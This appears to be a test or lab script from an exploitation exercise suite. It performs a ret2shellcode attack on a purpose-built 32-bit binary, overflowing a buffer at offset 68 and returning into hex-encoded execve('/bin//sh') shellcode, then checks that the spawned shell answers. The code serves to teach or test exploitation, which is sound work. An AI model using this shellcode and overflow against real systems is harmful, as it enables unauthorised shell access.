from common import BUILD, execute, p32, print_result, symbols

binary = BUILD / "ret2shellcode32"
sym = symbols(binary)
shellcode = bytes.fromhex(
    "31c050682f2f7368682f62696e89e3505389e189c2b00bcd80"
)
code = shellcode.ljust(256, b"\x90")
overflow = b"A" * 68 + p32(0x41410000)
print(f"[ret2shellcode] execve shellcode={len(shellcode)} bytes, RWX target=0x41410000, offset=68")
status, output = execute(binary, [code, overflow], b"echo RET2SHELLCODE_OK\nexit\n")
print_result("ret2shellcode", status, output, "RET2SHELLCODE_OK")
